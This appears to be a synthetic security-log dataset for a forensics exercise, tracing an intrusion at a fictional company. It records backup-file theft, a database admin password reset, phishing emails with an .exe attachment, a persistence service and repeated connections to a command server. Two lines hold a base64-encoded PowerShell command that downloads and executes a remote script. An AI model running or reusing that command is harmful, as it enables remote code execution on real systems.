+2025-06-10 09:15:19,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:15:19 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:15:20,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:15:20 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:15:21,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:15:21 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:15:22,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:15:22 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:15:23,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:15:23 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:15:24,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:15:24 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:15:25,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:15:25 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:15:26,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:15:26 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:15:27,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:15:27 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:15:28,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:15:28 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:15:29,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:15:29 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:15:30,172.16.10.20,WEB-01,nginx.access,45.33.22.11 - - [10/Jun/2025:09:15:30 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "http://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:20:00,172.16.10.20,WEB-01,nginx.access,192.168.1.100 - maryam [10/Jun/2025:09:20:00 +0000] "GET /wp-admin/ HTTP/1.1" 200 5342 "https://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:20:01,172.16.10.20,WEB-01,nginx.access,192.168.1.100 - maryam [10/Jun/2025:09:20:01 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 123 "https://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:20:02,172.16.10.20,WEB-01,nginx.access,192.168.1.100 - maryam [10/Jun/2025:09:20:02 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "https://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:20:03,172.16.10.20,WEB-01,nginx.access,192.168.1.100 - maryam [10/Jun/2025:09:20:03 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "https://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:20:04,172.16.10.20,WEB-01,nginx.access,192.168.1.100 - maryam [10/Jun/2025:09:20:04 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "https://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:20:05,172.16.10.20,WEB-01,nginx.access,192.168.1.100 - maryam [10/Jun/2025:09:20:05 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "https://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:20:06,172.16.10.20,WEB-01,nginx.access,192.168.1.100 - maryam [10/Jun/2025:09:20:06 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "https://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:20:07,172.16.10.20,WEB-01,nginx.access,192.168.1.100 - maryam [10/Jun/2025:09:20:07 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "https://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:20:08,172.16.10.20,WEB-01,nginx.access,192.168.1.100 - maryam [10/Jun/2025:09:20:08 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "https://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:20:09,172.16.10.20,WEB-01,nginx.access,192.168.1.100 - maryam [10/Jun/2025:09:20:09 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "https://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:20:10,172.16.10.20,WEB-01,nginx.access,192.168.1.100 - maryam [10/Jun/2025:09:20:10 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "https://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:20:11,172.16.10.20,WEB-01,nginx.access,192.168.1.100 - maryam [10/Jun/2025:09:20:11 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "https://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:20:12,172.16.10.20,WEB-01,nginx.access,192.168.1.100 - maryam [10/Jun/2025:09:20:12 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "https://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:20:13,172.16.10.20,WEB-01,nginx.access,192.168.1.100 - maryam [10/Jun/2025:09:20:13 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "https://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:20:14,172.16.10.20,WEB-01,nginx.access,192.168.1.100 - maryam [10/Jun/2025:09:20:14 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "https://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:20:15,172.16.10.20,WEB-01,nginx.access,192.168.1.100 - maryam [10/Jun/2025:09:20:15 +0000] "GET /wp-content/uploads/2025/06/backup.tar.gz HTTP/1.1" 200 104857600 "https://tosnet.ir/wp-admin/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+2025-06-10 09:30:00,172.16.10.30,DB-01,mysql,104,Connection: 127.0.0.1:3306,User: backup,Status: Connect
+2025-06-10 09:30:01,172.16.10.30,DB-01,mysql,100,SELECT * FROM customers,User: backup
+2025-06-10 09:30:02,172.16.10.30,DB-01,mysql,100,SELECT * FROM orders,User: backup
+2025-06-10 09:30:03,172.16.10.30,DB-01,mysql,104,Connection: 127.0.0.1:3306,User: backup,Status: Disconnect
+2025-06-10 09:35:00,172.16.10.30,DB-01,mysql,104,Connection: 127.0.0.1:3306,User: dbadmin,Status: Connect
+2025-06-10 09:35:01,172.16.10.30,DB-01,mysql,100,SELECT * FROM wp_users,User: dbadmin
+2025-06-10 09:35:02,172.16.10.30,DB-01,mysql,100,UPDATE wp_users SET user_pass = MD5('newpassword') WHERE user_login = 'admin',User: dbadmin
+2025-06-10 09:35:03,172.16.10.30,DB-01,mysql,104,Connection: 127.0.0.1:3306,User: dbadmin,Status: Disconnect
+2025-06-10 09:40:00,192.168.1.100,PC-MANAGER,Security,4688,Process Create,Image: C:\Windows\System32\cmd.exe,Command: cmd.exe /c whoami,Parent: explorer.exe
+2025-06-10 09:40:01,192.168.1.100,PC-MANAGER,Security,4688,Process Create,Image: C:\Windows\System32\powershell.exe,Command: powershell.exe -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAKQAvAG4AZQB0AFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADQALgAzADQALgAxADMAMgAuADEANQA6ADgAMAA4ADAALwB1AHAAZABhAHQAZQAuAHAAcwAxACcAKQAgAHwAIABJAEUAWAAgACgAKQA=,Parent: cmd.exe
+2025-06-10 09:40:02,192.168.1.100,PC-MANAGER,Security,7045,Service Created,Service Name: SysUpdate,Image Path: C:\ProgramData\svchost.exe,Start Type: Auto
+2025-06-10 09:40:03,192.168.1.100,PC-MANAGER,Security,5156,Process: C:\ProgramData\svchost.exe,Destination: 194.34.132.15:4444,Protocol: TCP,Action: Allow
+2025-06-10 09:40:04,192.168.1.100,PC-MANAGER,Security,5156,Process: C:\ProgramData\svchost.exe,Destination: 194.34.132.15:4444,Protocol: TCP,Action: Allow
+2025-06-10 09:40:05,192.168.1.100,PC-MANAGER,Security,5156,Process: C:\ProgramData\svchost.exe,Destination: 194.34.132.15:4444,Protocol: TCP,Action: Allow
+2025-06-10 09:40:06,192.168.1.100,PC-MANAGER,Security,5156,Process: C:\ProgramData\svchost.exe,Destination: 194.34.132.15:4444,Protocol: TCP,Action: Allow
+2025-06-10 09:40:07,192.168.1.100,PC-MANAGER,Security,5156,Process: C:\ProgramData\svchost.exe,Destination: 194.34.132.15:4444,Protocol: TCP,Action: Allow
+2025-06-10 09:40:08,192.168.1.100,PC-MANAGER,Security,5156,Process: C:\ProgramData\svchost.exe,Destination: 194.34.132.15:4444,Protocol: TCP,Action: Allow
+2025-06-10 09:40:09,192.168.1.100,PC-MANAGER,Security,5156,Process: C:\ProgramData\svchost.exe,Destination: 194.34.132.15:4444,Protocol: TCP,Action: Allow
+2025-06-10 09:40:10,192.168.1.100,PC-MANAGER,Security,5156,Process: C:\ProgramData\svchost.exe,Destination: 194.34.132.15:4444,Protocol: TCP,Action: Allow
+2025-06-10 09:40:11,192.168.1.100,PC-MANAGER,Security,5156,Process: C:\ProgramData\svchost.exe,Destination: 194.34.132.15:4444,Protocol: TCP,Action: Allow
+2025-06-10 09:40:12,192.168.1.100,PC-MANAGER,Security,5156,Process: C:\ProgramData\svchost.exe,Destination: 194.34.132.15:4444,Protocol: TCP,Action: Allow
+2025-06-10 09:40:13,192.168.1.100,PC-MANAGER,Security,5156,Process: C:\ProgramData\svchost.exe,Destination: 194.34.132.15:4444,Protocol: TCP,Action: Allow
+2025-06-10 09:40:14,192.168.1.100,PC-MANAGER,Security,5156,Process: C:\ProgramData\svchost.exe,Destination: 194.34.132.15:4444,Protocol: TCP,Action: Allow
+2025-06-10 09:40:15,192.168.1.100,PC-MANAGER,Security,5156,Process: C:\ProgramData\svchost.exe,Destination: 194.34.132.15:4444,Protocol: TCP,Action: Allow
+2025-06-10 09:40:16,192.168.1.100,PC-MANAGER,Security,5156,Process: C:\ProgramData\svchost.exe,Destination: 194.34.132.15:4444,Protocol: TCP,Action: Allow
+2025-06-10 09:40:17,192.168.1.100,PC-MANAGER,Security,5156,Process: C:\ProgramData\svchost.exe,Destination: 194.34.132.15:4444,Protocol: TCP,Action: Allow
+2025-06-10 09:40:18,192.168.1.100,PC-MANAGER,Security,5156,Process: C:\ProgramData\svchost.exe,Destination: 194.34.132.15:4444,Protocol: TCP,Action: Allow
+2025-06-10 09:40:19,192.168.1.100,PC-MANAGER,Security,5156,Process: C:\ProgramData\svchost.exe,Destination: 194.34.132.15:4444,Protocol: TCP,Action: Allow
+2025-06-10 09:40:20,192.168.1.100,PC-MANAGER,Security,5156,Process: C:\ProgramData\svchost.exe,Destination: 194.34.132.15:4444,Protocol: TCP,Action: Allow
+2025-06-10 09:40:21,192.168.1.100,PC-MANAGER,Security,5156,Process: C:\ProgramData\svchost.exe,Destination: 194.34.132.15:4444,Protocol: TCP,Action: Allow
+2025-06-10 09:40:22,192.168.1.100,PC-MANAGER,Security,5156,Process: C:\ProgramData\svchost.exe,Destination: 194.34.132.15:4444,Protocol: TCP,Action: Allow
+2025-06-10 09:40:23,192.168.1.100,PC-MANAGER,Security,5156,Process: C:\ProgramData\svchost.exe,Destination: 194.34.132.15:4444,Protocol: TCP,Action: Allow
+2025-06-10 09:40:24,192.168.1.100,PC-MANAGER,Security,5156,Process: C:\ProgramData\svchost.exe,Destination: 194.34.132.15:4444,Protocol: TCP,Action: Allow
+2025-06-10 09:40:25,192.168.1.100,PC-MANAGER,Security,5156,Process: C:\ProgramData\svchost.exe,Destination: 194.34.132.15:4444,Protocol: TCP,Action: Allow
+2025-06-10 09:40:26,192.168.1.100,PC-MANAGER,Security,5156,Process: C:\ProgramData\svchost.exe,Destination: 194.34.132.15:4444,Protocol: TCP,Action: Allow
+2025-06-10 09:40:27,192.168.1.100,PC-MANAGER,Security,5156,Process: C:\ProgramData\svchost.exe,Destination: 194.34.132.15:4444,Protocol: TCP,Action: Allow
+2025-06-10 09:40:28,192.168.1.100,PC-MANAGER,Security,5156,Process: C:\ProgramData\svchost.exe,Destination: 194.34.132.15:4444,Protocol: TCP,Action: Allow
+2025-06-10 09:40:29,192.168.1.100,PC-MANAGER,Security,5156,Process: C:\ProgramData\svchost.exe,Destination: 194.34.132.15:4444,Protocol: TCP,Action: Allow
+2025-06-10 09:40:30,192.168.1.100,PC-MANAGER,Security,5156,Process: C:\ProgramData\svchost.exe,Destination: 194.34.132.15:4444,Protocol: TCP,Action: Allow
+2025-06-10 09:40:31,192.168.1.100,PC-MANAGER,Security,5156,Process: C:\ProgramData\svchost.exe,Destination: 194.34.132.15:4444,Protocol: TCP,Action: Allow
+2025-06-10 09:40:32,192.168.1.100,PC-MANAGER,Security,5156,Process: C:\ProgramData\svchost.exe,Destination: 194.34.132.15:4444,Protocol: TCP,Action: Allow
+2025-06-10 09:40:33,192.168.1.100,PC-MANAGER,Security,5156,Process: C:\ProgramData\svchost.exe,Destination: 194.34.132.15:4444,Protocol: TCP,Action: Allow
+2025-06-10 09:40:34,192.168.1.100,PC-MANAGER,Security,5156,Process: C:\ProgramData\svchost.exe,Destination: 194.34.132.15:4444,Protocol: TCP,Action: Allow
+2025-06-10 09:40:35,192.168.1.100,PC-MANAGER,Security,5156,Process: C:\ProgramData\svchost.exe,Destination: 194.34.132.15:4444,Protocol: TCP,Action: Allow
+2025-06-10 09:40:36,192.168.1.100,PC-MANAGER,Security,5156,Process: C:\ProgramData\svchost.exe,Destination: 194.34.132.15:4444,Protocol: TCP,Action: Allow
+2025-06-10 09:40:37,192.168.1.100,PC-MANAGER,Security,5156,Process: C:\ProgramData\svchost.exe,Destination: 194.34.132.15:4444,Protocol: TCP,Action: Allow
+2025-06-10 09:40:38,192.168.1.100,PC-MANAGER,Security,5156,Process: C:\ProgramData\svchost.exe,Destination: 194.34.132.15:4444,Protocol: TCP,Action: Allow
+2025-06-10 09:40:39,192.168.1.100,PC-MANAGER,Security,5156,Process: C:\ProgramData\svchost.exe,Destination: 194.34.132.15:4444,Protocol: TCP,Action: Allow
+2025-06-10 09:40:40,192.168.1.100,PC-MANAGER,Security,5156,Process: C:\ProgramData\svchost.exe,Destination: 194.34.132.15:4444,Protocol: TCP,Action: Allow
+2025-06-10 09:40:41,192.168.1.100,PC-MANAGER,Security,5156,Process: C:\ProgramData\svchost.exe,Destination: 194.34.132.15:4444,Protocol: TCP,Action: Allow
+2025-06-10 09:40:42,192.168.1.100,PC-MANAGER,Security,5156,Process: C:\ProgramData\svchost.exe,Destination: 194.34.132.15:4444,Protocol: TCP,Action: Allow
+2025-06-10 09:40:43,192.168.1.100,PC-MANAGER,Security,5156,Process: C:\ProgramData\svchost.exe,Destination: 194.34.132.15:4444,Protocol: TCP,Action: Allow
+2025-06-10 09:40:44,192.168.1.100,PC-MANAGER,Security,5156,Process: C:\ProgramData\svchost.exe,Destination: 194.34.132.15:4444,Protocol: TCP,Action: Allow
+2025-06-10 09:40:45,192.168.1.100,PC-MANAGER,Security,5156,Process: C:\ProgramData\svchost.exe,Destination: 194.34.132.15:4444,Protocol: TCP,Action: Allow
+2025-06-10 09:40:46,192.168.1.100,PC-MANAGER,Security,5156,Process: C:\ProgramData\svchost.exe,Destination: 194.34.132.15:4444,Protocol: TCP,Action: Allow
+2025-06-10 09:40:47,192.168.1.100,PC-MANAGER,Security,5156,Process: C:\ProgramData\svchost.exe,Destination: 194.34.132.15:4444,Protocol: TCP,Action: Allow
+2025-06-10 09:40:48,192.168.1.100,PC-MANAGER,Security,5156,Process: C:\ProgramData\svchost.exe,Destination: 194.34.132.15:4444,Protocol: TCP,Action: Allow
+2025-06-10 09:40:49,192.168.1.100,PC-MANAGER,Security,5156,Process: C:\ProgramData\svchost.exe,Destination: 194.34.132.15:4444,Protocol: TCP,Action: Allow
+2025-06-10 09:40:50,192.168.1.100,PC-MANAGER,Security,5156,Process: C:\ProgramData\svchost.exe,Destination: 194.34.132.15:4444,Protocol: TCP,Action: Allow
+2025-06-10 09:45:00,172.16.10.50,MAIL-01,postfix,LOG,From: maryam@tosnet.ir,To: client@domain.com,Subject: Contract proposal
+2025-06-10 09:45:01,172.16.10.50,MAIL-01,postfix,LOG,From: reza@tosnet.ir,To: accountant@domain.com,Subject: Monthly report
+2025-06-10 09:45:02,172.16.10.50,MAIL-01,postfix,LOG,From: saeed@tosnet.ir,To: dev@domain.com,Subject: Code review
+2025-06-10 09:45:03,172.16.10.50,MAIL-01,postfix,LOG,From: 194.34.132.15,To: maryam@tosnet.ir,Subject: Invoice #2025-06-10,Attachment: invoice_pdf.exe
+2025-06-10 09:45:04,172.16.10.50,MAIL-01,postfix,LOG,From: 194.34.132.15,To: reza@tosnet.ir,Subject: Invoice #2025-06-10,Attachment: invoice_pdf.exe
+2025-06-10 09:45:05,172.16.10.50,MAIL-01,postfix,LOG,From: 194.34.132.15,To: saeed@tosnet.ir,Subject: Invoice #2025-06-10,Attachment: invoice_pdf.exe
+2025-06-10 09:45:06,172.16.10.50,MAIL-01,postfix,LOG,From: 194.34.132.15,To: info@tosnet.ir,Subject: Invoice #2025-06-10,Attachment: invoice_pdf.exe
+2025-06-10 09:45:07,172.16.10.50,MAIL-01,postfix,LOG,From: 194.34.132.15,To: admin@tosnet.ir,Subject: Invoice #2025-06-10,Attachment: invoice_pdf.exe
+2025-06-10 10:00:00,172.16.10.60,BACKUP-01,Security,4624,Logon Type 3,User: Veeam,Source IP: 172.16.10.50,Share: \BACKUP-01\Backup
+2025-06-10 10:00:01,172.16.10.60,BACKUP-01,Security,5156,Process: C:\Program Files\Veeam\Backup.exe,Destination: 172.16.10.50:443,Protocol: TCP,Action: Allow
+2025-06-10 10:00:02,172.16.10.60,BACKUP-01,Security,5156,Process: C:\Program Files\Veeam\Backup.exe,Destination: 172.16.10.50:443,Protocol: TCP,Action: Allow
+2025-06-10 10:00:03,172.16.10.60,BACKUP-01,Security,5156,Process: C:\Program Files\Veeam\Backup.exe,Destination: 172.16.10.50:443,Protocol: TCP,Action: Allow
+2025-06-10 10:00:04,172.16.10.60,BACKUP-01,Security,5156,Process: C:\Program Files\Veeam\Backup.exe,Destination: 172.16.10.50:443,Protocol: TCP,Action: Allow
+2025-06-10 10:00:05,172.16.10.60,BACKUP-01,Security,5156,Process: C:\Program Files\Veeam\Backup.exe,Destination: 172.16.10.50:443,Protocol: TCP,Action: Allow
+2025-06-10 10:00:06,172.16.10.60,BACKUP-01,Security,5156,Process: C:\Program Files\Veeam\Backup.exe,Destination: 172.16.10.50:443,Protocol: TCP,Action: Allow
+2025-06-10 10:00:07,172.16.10.60,BACKUP-01,Security,5156,Process: C:\Program Files\Veeam\Backup.exe,Destination: 172.16.10.50:443,Protocol: TCP,Action: Allow
+2025-06-10 10:00:08,172.16.10.60,BACKUP-01,Security,5156,Process: C:\Program Files\Veeam\Backup.exe,Destination: 172.16.10.50:443,Protocol: TCP,Action: Allow
+2025-06-10 10:00:09,172.16.10.60,BACKUP-01,Security,5156,Process: C:\Program Files\Veeam\Backup.exe,Destination: 172.16.10.50:443,Protocol: TCP,Action: Allow
+2025-06-10 10:00:10,172.16.10.60,BACKUP-01,Security,5156,Process: C:\Program Files\Veeam\Backup.exe,Destination: 172.16.10.50:443,Protocol: TCP,Action: Allow
+2025-06-10 10:00:11,172.16.10.60,BACKUP-01,Security,5156,Process: C:\Program Files\Veeam\Backup.exe,Destination: 172.16.10.50:443,Protocol: TCP,Action: Allow
+2025-06-10 10:00:12,172.16.10.60,BACKUP-01,Security,5156,Process: C:\Program Files\Veeam\Backup.exe,Destination: 172.16.10.50:443,Protocol: TCP,Action: Allow
+2025-06-10 10:00:13,172.16.10.60,BACKUP-01,Security,5156,Process: C:\Program Files\Veeam\Backup.exe,Destination: 172.16.10.50:443,Protocol: TCP,Action: Allow
+2025-06-10 10:00:14,172.16.10.60,BACKUP-01,Security,5156,Process: C:\Program Files\Veeam\Backup.exe,Destination: 172.16.10.50:443,Protocol: TCP,Action: Allow
+2025-06-10 10:00:15,172.16.10.60,BACKUP-01,Security,5156,Process: C:\Program Files\Veeam\Backup.exe,Destination: 172.16.10.50:443,Protocol: TCP,Action: Allow
+2025-06-10 10:00:16,172.16.10.60,BACKUP-01,Security,5156,Process: C:\Program Files\Veeam\Backup.exe,Destination: 172.16.10.50:443,Protocol: TCP,Action: Allow
+2025-06-10 10:00:17,172.16.10.60,BACKUP-01,Security,5156,Process: C:\Program Files\Veeam\Backup.exe,Destination: 172.16.10.50:443,Protocol: TCP,Action: Allow
+2025-06-10 10:00:18,172.16.10.60,BACKUP-01,Security,5156,Process: C:\Program Files\Veeam\Backup.exe,Destination: 172.16.10.50:443,Protocol: TCP,Action: Allow
+2025-06-10 10:00:19,172.16.10.60,BACKUP-01,Security,5156,Process: C:\Program Files\Veeam\Backup.exe,Destination: 172.16.10.50:443,Protocol: TCP,Action: Allow
+2025-06-10 10:00:20,172.16.10.60,BACKUP-01,Security,5156,Process: C:\Program Files\Veeam\Backup.exe,Destination: 172.16.10.50:443,Protocol: TCP,Action: Allow
+2025-06-10 10:00:21,172.16.10.60,BACKUP-01,Security,5156,Process: C:\Program Files\Veeam\Backup.exe,Destination: 172.16.10.50:443,Protocol: TCP,Action: Allow
+2025-06-10 10:00:22,172.16.10.60,BACKUP-01,Security,5156,Process: C:\Program Files\Veeam\Backup.exe,Destination: 172.16.10.50:443,Protocol: TCP,Action: Allow
+2025-06-10 10:00:23,172.16.10.60,BACKUP-01,Security,5156,Process: C:\Program Files\Veeam\Backup.exe,Destination: 172.16.10.50:443,Protocol: TCP,Action: Allow
+2025-06-10 10:00:24,172.16.10.60,BACKUP-01,Security,5156,Process: C:\Program Files\Veeam\Backup.exe,Destination: 172.16.10.50:443,Protocol: TCP,Action: Allow
+2025-06-10 10:00:25,172.16.10.60,BACKUP-01,Security,5156,Process: C:\Program Files\Veeam\Backup.exe,Destination: 172.16.10.50:443,Protocol: TCP,Action: Allow
+2025-06-10 11:00:00,192.168.1.100,PC-MANAGER,Security,4624,Logon Type 10,User: maryam,Source IP: 192.168.1.100,Process: C:\Windows\System32\winlogon.exe
+2025-06-10 11:00:01,192.168.1.100,PC-MANAGER,Security,4672,Special Privileges,User: maryam
+2025-06-10 11:00:02,192.168.1.100,PC-MANAGER,Security,4688,Process Create,Image: C:\Windows\System32\cmd.exe,Command: cmd.exe /c whoami,Parent: explorer.exe
+2025-06-10 11:00:03,192.168.1.100,PC-MANAGER,Security,4688,Process Create,Image: C:\Windows\System32\powershell.exe,Command: powershell.exe -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAKQAvAG4AZQB0AFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADQALgAzADQALgAxADMAMgAuADEANQA6ADgAMAA4ADAALwB1AHAAZABhAHQAZQAuAHAAcwAxACcAKQAgAHwAIABJAEUAWAAgACgAKQA=,Parent: cmd.exe
+2025-06-10 11:00:04,192.168.1.100,PC-MANAGER,Security,7045,Service Created,Service Name: SysUpdate,Image Path: C:\ProgramData\svchost.exe,Start Type: Auto
+2025-06-10 11:00:05,192.168.1.100,PC-MANAGER,Security,5156,Process: C:\ProgramData\svchost.exe,Destination: 194.34.132.15:4444,Protocol: TCP,Action: Allow
+2025-06-10 11:00:06,192.168.1.100,PC-MANAGER,Security,5156,Process: C:\ProgramData\svchost.exe,Destination: 194.34.132.15:4444,Protocol: TCP,Action: Allow
+2025-06-10 11:00:07,192.168.1.100,PC-MANAGER,Security,5156,Process: C:\ProgramData\svchost.exe,Destination: 194.34.132.15:4444,Protocol: TCP,Action: Allow
+2025-06-10 11:00:08,192.168.1.100,PC-MANAGER,Security,5156,Process: C:\ProgramData\svchost.exe,Destination: 194.34.132.15:4444,Protocol: TCP,Action: Allow
+2025-06-10 11:00:09,192.168.1.100,PC-MANAGER,Security,5156,Process: C:\ProgramData\svchost.exe,Destination: 194.34.132.15:4444,Protocol: TCP,Action: Allow
+2025-06-10 11:00:10,192.168.1.100,PC-MANAGER,Security,5156,Process: C:\ProgramData\svchost.exe,Destination: 194.34.132.15:4444,Protocol: TCP,Action: Allow
+2025-06-10 11:00:11,192.168.1.100,PC-MANAGER,Security,5156,Process: C:\ProgramData\svchost.exe,Destination: 194.34.132.15:4444,Protocol: TCP,Action: Allow
+2025-06-10 11:00:12,192.168.1.100,PC-MANAGER,Security,5156,Process: C:\ProgramData\svchost.exe,Destination: 194.34.132.15:4444,Protocol: TCP,Action: Allow
+2025-06-10 11:00:13,192.168.1.100,PC-MANAGER,Security,5156,Process: C:\ProgramData\svchost.exe,Destination: 194.34.132.15:4444,Protocol: TCP,Action: Allow
+2025-06-10 11:00:14,192.168.1.100,PC-MANAGER,Security,5156,Process: C:\ProgramData\svchost.exe,Destination: 194.34.132.15:4444,Protocol: TCP,Action: Allow
+2025-06-10 11:00:15,192.168.1.100,PC-MANAGER,Security,5156,Process: C:\ProgramData\svchost.exe,Destination: 194.34.132.15:4444,Protocol: TCP,Action: Allow
+2025-06-10 11:00:16,192.168.1.100,PC-MANAGER,Security,5156,Process: C:\ProgramData\svchost.exe,Destination: 194.34.132.15:4444,Protocol: TCP,Action: Allow
+2025-06-10 11:00:17,192.168.1.100,PC-MANAGER,Security,5156,Process: C:\ProgramData\svchost.exe,Destination: 194.34.132.15:4444,Protocol: TCP,Action: Allow
+2025-06-10 11:00:18,192.168.1.100,PC-MANAGER,Security,5156,Process: C:\ProgramData\svchost.exe,Destination: 194.34.132.15:4444,Protocol: TCP,Action: Allow
+2025-06-10 11:00:19,192.168.1.100,PC-MANAGER,Security,5156,Process: C:\ProgramData\svchost.exe,Destination: 194.34.132.15:4444,Protocol: TCP,Action: Allow
+2025-06-10 11:00:20,192.168.1.100,PC-MANAGER,Security,5156,Process: C:\ProgramData\svchost.exe,Destination: 194.34.132.15:4444,Protocol: TCP,Action: Allow
+2025-06-10 11:00:21,192.168.1.100,PC-MANAGER,Security,5156,Process: C:\ProgramData\svchost.exe,Destination: 194.34.132.15:4444,Protocol: TCP,Action: Allow
+2025-06-10 11:00:22,192.168.1.100,PC-MANAGER,Security,5156,Process: C:\ProgramData\svchost.exe,Destination: 194.34.132.15:4444,Protocol: TCP,Action: Allow
+2025-06-10 11:00:23,192.168.1.100,PC-MANAGER,Security,5156,Process: C:\ProgramData\svchost.exe,Destination: 194.34.132.15:4444,Protocol: TCP,Action: Allow
+2025-06-10 11:00:24,192.168.1.100,PC-MANAGER,Security,5156,Process: C:\ProgramData\svchost.exe,Destination: 194.34.132.15:4444,Protocol: TCP,Action: Allow
